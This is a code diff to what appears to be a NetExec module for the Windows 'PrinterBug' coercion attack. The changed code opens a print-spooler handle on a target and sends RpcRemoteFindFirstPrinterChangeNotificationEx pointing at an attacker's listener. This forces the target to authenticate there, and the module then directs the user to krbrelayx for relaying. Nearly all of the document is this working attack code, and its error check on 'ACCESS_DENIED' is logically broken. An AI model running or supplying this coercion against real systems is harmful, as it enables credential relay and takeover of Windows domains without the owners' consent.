@@ -1,5 +1,5 @@
 from impacket import system_errors
-from impacket.dcerpc.v5 import transport
+from impacket.dcerpc.v5 import transport, rprn
 from impacket.dcerpc.v5.ndr import NDRCALL
 from impacket.dcerpc.v5.dtypes import ULONG, WSTR, DWORD
 from impacket.dcerpc.v5.rpcrt import DCERPCException
@@ -41,7 +41,7 @@ class NXCModule:
 
         if dce is not None:
             context.log.debug("Target is vulnerable to PrinterBug")
-            trigger.RpcRemoteFindFirstPrinterChange(dce, self.listener)
+            trigger.RpcRemoteFindFirstPrinterChange(dce, self.listener,connection.host if not connection.kerberos else connection.hostname + "." + connection.domain)
             context.log.highlight("VULNERABLE")
             context.log.highlight("Next step: https://github.com/dirkjanm/krbrelayx")
             dce.disconnect()
@@ -67,36 +67,15 @@ class DCERPCSessionError(DCERPCException):
 ################################################################################
 # RPC CALLS
 ################################################################################
-class RpcRemoteFindFirstPrinterChange(NDRCALL):
-    opnum = 13
-    structure = (
-        ("ServerName", WSTR),
-        ("RootShare", WSTR),
-        ("ApiFlags", DWORD),
-    )
 
-
-class RpcRemoteFindFirstPrinterChangeResponse(NDRCALL):
-    structure = (("ErrorCode", ULONG),)
-
-
-class NetrDfsAddRoot(NDRCALL):
-    opnum = 12
-    structure = (
-        ("ServerName", WSTR),
-        ("RootShare", WSTR),
-        ("Comment", WSTR),
-        ("ApiFlags", DWORD),
-    )
-
-
-class NetrDfsAddRootResponse(NDRCALL):
-    structure = (("ErrorCode", ULONG),)
 
 
 class TriggerAuth:
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost):
+        
         rpctransport = transport.DCERPCTransportFactory(r"ncacn_np:%s[\PIPE\spoolss]" % target)
+        rpctransport.set_dport(445)
+
         if hasattr(rpctransport, "set_credentials"):
             rpctransport.set_credentials(
                 username=username,
@@ -120,23 +99,42 @@ class TriggerAuth:
             nxc_logger.debug(f"Something went wrong, check error status => {e!s}")
             return None
         try:
-            dce.bind(uuidtup_to_bin(("12345678-1234-ABCD-EF00-0123456789AB", "1.0")))
+            dce.bind(rprn.MSRPC_UUID_RPRN)            
         except Exception as e:
             nxc_logger.debug(f"Something went wrong, check error status => {e!s}")
             return None
         nxc_logger.debug("[+] Successfully bound!")
         return dce
 
-    def RpcRemoteFindFirstPrinterChange(self, dce, listener):
+    def RpcRemoteFindFirstPrinterChange(self, dce, listener,target):
         nxc_logger.debug("[-] Sending RpcRemoteFindFirstPrinterChange!")
         try:
-            request = RpcRemoteFindFirstPrinterChange()
-            request["ServerName"] = f"{listener}\x00"
-            request["RootShare"] = "test\x00"
-            request["ApiFlags"] = 1
-            if self.args.verbose:
-                nxc_logger.debug(request.dump())
-            dce.request(request)
+            resp = rprn.hRpcOpenPrinter(dce, '\\\\%s\x00' % target)
+        except Exception as e:
+            if str(e).find('Broken pipe') >= 0:
+                # The connection timed-out. Let's try to bring it back next round
+                nxc_logger.error('Connection failed - skipping host!')
+                return
+            elif str(e).upper().find('ACCESS_DENIED'):
+                # We're not admin, bye
+                nxc_logger.error('Access denied - RPC call was denied')
+                dce.disconnect()
+                return
+            else:
+                raise
+        nxc_logger.debug('Got handle')
 
+        try:
+            request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
+            request['hPrinter'] =  resp['pHandle']
+            request['fdwFlags'] =  rprn.PRINTER_CHANGE_ADD_JOB
+            request['pszLocalMachine'] =  '\\\\%s\x00' % listener
+            request['pOptions'] =  NULL
+            nxc_logger.debug(request.dump())
+        except Exception as e:
+            nxc_logger.debug(e)
+
+        try:
+            dce.request(request)
         except Exception as e:
             nxc_logger.debug(e)
